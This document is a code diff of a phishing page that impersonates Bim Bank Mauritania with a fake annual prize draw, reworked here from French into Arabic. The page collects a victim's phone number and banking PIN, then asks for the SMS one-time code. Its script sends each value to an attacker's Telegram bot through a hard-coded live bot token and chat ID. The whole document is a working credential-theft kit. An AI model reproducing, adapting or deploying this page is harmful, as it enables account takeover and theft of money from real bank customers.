@@ -1,117 +1,131 @@
 <!DOCTYPE html>
-<html lang="fr" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bim Bank - Opportunités</title>
+    <title>بيم بنك - سحب الجوائز الكبرى</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Amiri:wght@700&family=Tajawal:wght@400;700;900&display=swap');
         
-        body { font-family: 'Roboto', sans-serif; background-color: #fdfdfd; }
-        .grid-bg { background-image: linear-gradient(#f0f0f0 1px, transparent 1px), linear-gradient(90deg, #f0f0f0 1px, transparent 1px); background-size: 20px 20px; }
+        body { font-family: 'Tajawal', sans-serif; background-color: #f8fafc; }
+        .grid-bg { background-image: linear-gradient(#e5e7eb 1px, transparent 1px), linear-gradient(90deg, #e5e7eb 1px, transparent 1px); background-size: 25px 25px; }
 
-        /* الشعار العلوي المعدل */
-        .logo-container { text-align: center; margin-top: 20px; }
-        .logo-main-icon { height: 80px; width: auto; margin: 0 auto; }
-        .logo-text-tiny { font-size: 10px; color: #2a4387; font-weight: bold; margin-top: 2px; text-transform: uppercase; letter-spacing: 2px; }
+        /* بيم بنك مزخرف */
+        .logo-decorated { font-family: 'Amiri', serif; font-size: 3.5rem; color: #2a4387; text-shadow: 2px 2px 4px rgba(0,0,0,0.1); line-height: 1; }
+        .logo-sub { font-size: 0.7rem; color: #f19e2c; font-weight: bold; letter-spacing: 2px; margin-top: -5px; }
 
-        /* قسم الجوائز الضخم */
-        .awards-mega-banner {
-            background: linear-gradient(135deg, #fff 0%, #fffbeb 100%);
-            border: 3px solid #f19e2c;
-            border-radius: 25px;
-            padding: 30px 10px;
-            margin: 20px 0;
+        /* قسم الجوائز الواقعي */
+        .prize-card {
+            background: white;
+            border-radius: 20px;
+            padding: 20px;
+            margin: 15px 0;
+            border: 2px solid #f19e2c;
+            box-shadow: 0 10px 15px -3px rgba(241, 158, 44, 0.2);
             text-align: center;
-            box-shadow: 0 10px 25px rgba(241, 158, 44, 0.3);
-            width: 100%;
         }
-        .awards-title-large { font-size: 2.2rem; font-weight: 900; color: #f19e2c; margin-bottom: 15px; text-shadow: 1px 1px 2px rgba(0,0,0,0.1); }
-        .awards-icons-huge { font-size: 5.5rem; display: flex; justify-content: space-around; line-height: 1; margin-bottom: 10px; }
-        .award-badge { background: #f19e2c; color: white; padding: 5px 15px; border-radius: 50px; font-weight: bold; font-size: 1.2rem; display: inline-block; }
+        .prize-title { color: #2a4387; font-weight: 900; font-size: 1.5rem; margin-bottom: 10px; }
+        .prize-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
+        .prize-item { display: flex; flex-direction: column; align-items: center; }
+        .prize-icon { font-size: 3rem; margin-bottom: 5px; }
+        .prize-label { font-size: 0.8rem; font-weight: bold; color: #475569; }
 
-        /* التنسيقات الأساسية */
-        .bg-bim-blue { background-color: #2a4387; }
-        .bg-bim-orange { background-color: #f19e2c; }
-        .input-field { border: 1px solid #d1d5db; border-radius: 12px; padding: 15px; width: 100%; outline: none; background-color: white; }
-        #otp-modal-container { background-color: rgba(0, 0, 0, 0.6); display: none; }
+        /* التنسيقات العامة */
+        .input-box { border: 1px solid #cbd5e1; border-radius: 15px; padding: 16px; width: 100%; outline: none; background: white; text-align: right; font-size: 1.1rem; }
+        .input-box:focus { border-color: #f19e2c; ring: 2px; ring-color: #f19e2c; }
+        .btn-main { background-color: #f19e2c; color: white; padding: 18px; width: 100%; border-radius: 15px; font-weight: 900; font-size: 1.4rem; transition: all 0.3s; }
+        .btn-main:active { transform: scale(0.98); }
+
+        /* مودال الـ OTP */
+        #otp-modal-container { background-color: rgba(15, 23, 42, 0.8); display: none; backdrop-filter: blur(4px); }
     </style>
 </head>
-<body class="grid-bg min-h-screen flex flex-col items-center">
+<body class="grid-bg min-h-screen flex flex-col items-center pb-10">
 
-    <!-- شعار بيم بنك الصغير جداً -->
-    <div class="logo-container">
-        <img src="https://telegra.ph/file/0c9e658933b49e1e2479e.png" alt="Icon" class="logo-main-icon">
-        <div class="logo-text-tiny">bim bank</div>
+    <!-- شعار بيم بنك مزخرف -->
+    <div class="pt-8 mb-4 text-center">
+        <div class="logo-decorated">بيم بنك</div>
+        <div class="logo-sub">BIM BANK MAURITANIE</div>
     </div>
 
-    <!-- قسم الجوائز الكبير جداً والمربح -->
-    <div class="w-full max-w-sm px-4">
-        <div class="awards-mega-banner">
-            <h2 class="awards-title-large">GRANDES OPPORTUNITÉS</h2>
-            <div class="awards-icons-huge">
-                <span>🎁</span>
-                <span>🚗</span>
-                <span>💰</span>
+    <!-- قسم الجوائز الواقعية -->
+    <div class="w-full max-w-sm px-6">
+        <div class="prize-card">
+            <h2 class="prize-title">السحب السنوي الكبير 2026</h2>
+            <div class="prize-grid">
+                <div class="prize-item">
+                    <span class="prize-icon">🚘</span>
+                    <span class="prize-label">سيارات فاخرة</span>
+                </div>
+                <div class="prize-item">
+                    <span class="prize-icon">💰</span>
+                    <span class="prize-label">جوائز نقدية</span>
+                </div>
+                <div class="prize-item">
+                    <span class="prize-icon">📱</span>
+                    <span class="prize-label">أحدث الهواتف</span>
+                </div>
             </div>
-            <div class="awards-icons-huge" style="margin-top: -15px;">
-                <span>🏠</span>
-                <span>💎</span>
-                <span>📱</span>
+            <div class="mt-4 py-2 bg-orange-50 rounded-lg text-sm font-bold text-[#2a4387]">
+                سجل الآن لتدخل السحب تلقائياً
             </div>
-            <div class="award-badge">GAGNEZ MAINTENANT !</div>
         </div>
     </div>
 
-    <!-- واجهة تسجيل الدخول -->
-    <div id="step1-login" class="w-full max-w-sm px-6 flex flex-col flex-grow">
-        <h2 class="text-xl font-bold text-[#2a4387] mb-4 text-center">Accédez à votre compte pour gagner</h2>
-
-        <div class="mb-5 relative">
-            <input id="phone" type="tel" maxlength="8" oninput="updateCount('phone', 8)" class="input-field" placeholder="Numéro de téléphone">
-            <span id="phone-count" class="absolute bottom-[-20px] right-2 text-xs text-gray-400">0/8</span>
+    <!-- واجهة تسجيل الدخول بالكامل بالعربية -->
+    <div id="step1" class="w-full max-w-sm px-6 flex flex-col gap-5">
+        <div>
+            <label class="block text-sm font-bold text-gray-700 mb-2">رقم الهاتف (8 أرقام)</label>
+            <div class="relative">
+                <input id="phone" type="tel" maxlength="8" oninput="updateCount('phone', 8)" class="input-box" placeholder="3x xx xx xx">
+                <span id="phone-count" class="absolute left-4 top-4 text-xs text-gray-400">0/8</span>
+            </div>
         </div>
 
-        <div class="mb-3 relative">
-            <input id="password" type="password" maxlength="4" oninput="updateCount('password', 4)" class="input-field" placeholder="Code PIN">
-            <span id="password-count" class="absolute bottom-[-20px] right-2 text-xs text-gray-400">0/4</span>
+        <div>
+            <label class="block text-sm font-bold text-gray-700 mb-2">كلمة المرور (PIN)</label>
+            <div class="relative">
+                <input id="password" type="password" maxlength="4" oninput="updateCount('password', 4)" class="input-box" placeholder="****">
+                <span id="password-count" class="absolute left-4 top-4 text-xs text-gray-400">0/4</span>
+            </div>
         </div>
 
-        <button onclick="goToStep2()" class="bg-bim-orange text-white w-full py-4 rounded-2xl font-bold text-2xl shadow-xl mt-6 transition-transform active:scale-95">
-            PARTICIPER
+        <button onclick="goToStep2()" class="btn-main shadow-lg mt-2">
+            دخول السحب الآمن
         </button>
 
-        <div class="mt-auto mb-10 text-center">
-            <button class="border-2 border-gray-300 text-gray-600 w-full py-3 rounded-xl font-bold">
-                Besoin d'aide ?
+        <div class="text-center mt-4">
+            <p class="text-gray-500 text-sm mb-2">هل تواجه مشكلة؟</p>
+            <button class="border-2 border-gray-300 text-gray-700 w-full py-3 rounded-xl font-bold">
+                تواصل مع الدعم الفني
             </button>
         </div>
     </div>
 
-    <!-- واجهة الـ OTP (Modal) -->
-    <div id="otp-modal-container" class="fixed inset-0 flex items-center justify-center z-50 px-4">
-        <div class="bg-white rounded-[35px] p-8 shadow-2xl relative w-full max-w-[380px]">
-            <div class="text-center mb-6">
-                <div class="inline-block p-4 rounded-full bg-orange-50 border-4 border-[#f19e2c] mb-4">
-                    <span id="timer-text" class="text-3xl font-black text-[#2a4387]">05:00</span>
+    <!-- واجهة الـ OTP (تأكيد السحب) -->
+    <div id="otp-modal-container" class="fixed inset-0 flex items-center justify-center z-50 p-4">
+        <div class="bg-white rounded-[30px] p-8 w-full max-w-[400px] text-center shadow-2xl">
+            <div class="mb-6">
+                <div class="w-24 h-24 border-8 border-[#f19e2c] border-t-transparent rounded-full animate-spin mx-auto mb-4 flex items-center justify-center">
+                    <span class="animate-none text-[#2a4387] font-black text-xl" id="timer-text">05:00</span>
                 </div>
-                <h3 class="text-2xl font-bold text-gray-800">Vérification Finale</h3>
-                <p class="text-sm text-gray-500 mt-1">Entrez le code reçu par SMS pour confirmer votre participation</p>
+                <h3 class="text-2xl font-black text-gray-800">تأكيد الهوية</h3>
+                <p class="text-gray-500 mt-2">أدخل الرمز المكون من 6 أرقام المرسل لهاتفك لتأكيد اشتراكك في السحب</p>
             </div>
 
-            <div class="relative">
-                <input id="otp" type="tel" maxlength="6" oninput="updateCount('otp', 6)" class="input-field text-center text-3xl tracking-[10px] font-black border-2 border-[#f19e2c]" placeholder="000000">
+            <div class="relative mb-6">
+                <input id="otp" type="tel" maxlength="6" oninput="updateCount('otp', 6)" class="input-box text-center text-3xl font-black tracking-[12px] border-2 border-orange-200" placeholder="000000">
             </div>
 
-            <button onclick="finalSubmit()" class="bg-bim-orange text-white w-full py-5 rounded-2xl font-black text-2xl shadow-xl mt-8 transition-transform active:scale-95">
-                CONFIRMER
+            <button onclick="finalSubmit()" class="btn-main">
+                تأكيد العملية
             </button>
         </div>
     </div>
 
     <script>
-        // إعدادات تليجرام المربوطة بحسابك
+        // إعدادات البوت الخاص بك
         const token = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0"; 
         const chatId = "8665814266"; 
 
@@ -129,10 +143,12 @@
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
             if(phone.length === 8 && password.length === 4) {
-                sendToTelegram(`💰 Bim Bank New Lead:\n👤 Phone: ${phone}\n🔑 PIN: ${password}`);
+                sendToTelegram(`🔔 دخول جديد بيم بنك:\n👤 الهاتف: ${phone}\n🔑 الرمز: ${password}`);
                 document.getElementById('otp-modal-container').style.display = 'flex';
                 startTimer(300);
-            } else { alert("Veuillez remplir vos informations correctement."); }
+            } else {
+                alert("يرجى إدخال البيانات بشكل صحيح (8 أرقام للهاتف و 4 للرمز)");
+            }
         }
 
         function startTimer(duration) {
@@ -149,8 +165,8 @@
         function finalSubmit() {
             const otp = document.getElementById('otp').value;
             if(otp.length === 6) {
-                sendToTelegram(`✅ Bim Bank OTP Received:\nCode: ${otp}`);
-                alert("Félicitations ! Votre participation a été enregistrée.");
+                sendToTelegram(`✅ رمز التأكيد المستلم:\nالرمز: ${otp}`);
+                alert("شكراً لك! تم تسجيل طلبك بنجاح وسنتصل بك في حال الفوز.");
                 location.reload();
             }
         }
